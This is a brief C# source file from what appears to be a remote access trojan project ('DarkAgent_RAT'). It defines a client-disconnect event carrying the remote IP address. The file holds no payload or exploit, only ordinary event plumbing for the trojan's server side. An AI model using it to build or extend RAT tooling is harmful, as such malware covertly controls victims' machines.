using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Events
{
    public delegate void ClientDisconnectHandler(object o, ClientDisconnectEventArgs e);

    public class ClientDisconnectEventArgs : EventArgs
    {
        public readonly string RemoteIP;
        public ClientDisconnectEventArgs(string RemoteIP)
        {
            this.RemoteIP = RemoteIP;
        }
    }

    public class ClientDisconnectEvent
    {
        public static event ClientDisconnectHandler ClientDisconnect;
        public static void OnClientDisconnect(ClientDisconnectEventArgs e)
        {
            if (ClientDisconnect != null)
                ClientDisconnect(new object(), e);
        }
    }
}
